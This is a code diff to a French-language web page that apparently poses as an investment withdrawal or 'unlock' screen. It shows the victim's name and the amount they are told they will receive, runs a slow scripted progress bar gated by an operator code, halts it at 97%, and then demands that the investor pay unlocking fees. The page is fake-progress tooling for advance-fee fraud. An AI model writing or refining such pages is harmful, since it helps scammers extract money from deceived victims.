@@ -111,7 +111,7 @@
     </style>
 </head>
 <body>
-<!--     <img src="./sss.png" alt="Image" class="top-left-image"> <!-- Chemin relatif --> -->
+    <img src="./sss.png" alt="Image" class="top-left-image"> <!-- Chemin relatif -->
     <div id="investor-info" class="interface"></div>
     <div class="background-image"></div>
     <div class="interface">   
@@ -126,7 +126,7 @@
         </div><br>
         <div><p style="color: #8B0000; font-weight: bold;" id="alert-msg"></p></div>  
         <div class="transfer-text"></div>
-        <input type="button" value="Demarrer" class="button-debloquer">
+        <input type="button" value="Débloquer" class="button-debloquer" id="btn-deblock">
     </div>
 
     <script>
@@ -146,6 +146,15 @@
             <div class="transfer-text">Réseau utilisé : ${network}</div>
             <div class="transfer-text">Montant total à recevoir : ${totalAmount}</div>
         `;
+        document.querySelector('#btn-deblock').addEventListener('click', () => {
+            let code2 = prompt("Veuillez entrer le code pour débloquer")
+            if(code2 == "2120"){
+                interval = setInterval(progress, 8500); // Change speed here
+            }else{
+                alert("Code incorrect")
+            }
+
+        })
 
         // Animation de la barre de progression
         const progressBar = document.querySelector('.progress');
@@ -154,7 +163,7 @@
         let interval;
 
         function progress() {
-            if (percent <= 0) {
+            if (percent <= 97) {
                 progressBar.style.width = percent + '%';
                 progressPercent.textContent = percent + '%';
                 percent++;
@@ -163,11 +172,10 @@
             }
 
             if (percent == 97) {
-                document.querySelector('#alert-msg').innerText = 'Alert : Mr/Mme '+ investorName +' veillez payer les frais de deblocage de votre investissement';
+                document.querySelector('#alert-msg').innerText = 'Alert : Mr/Mme '+ investorName +' veuillez payer les frais de deblocage de votre investissement';
             }
         }
 
-        interval = setInterval(progress, 8500); // Change speed here
     </script>
 </body>
 </html>
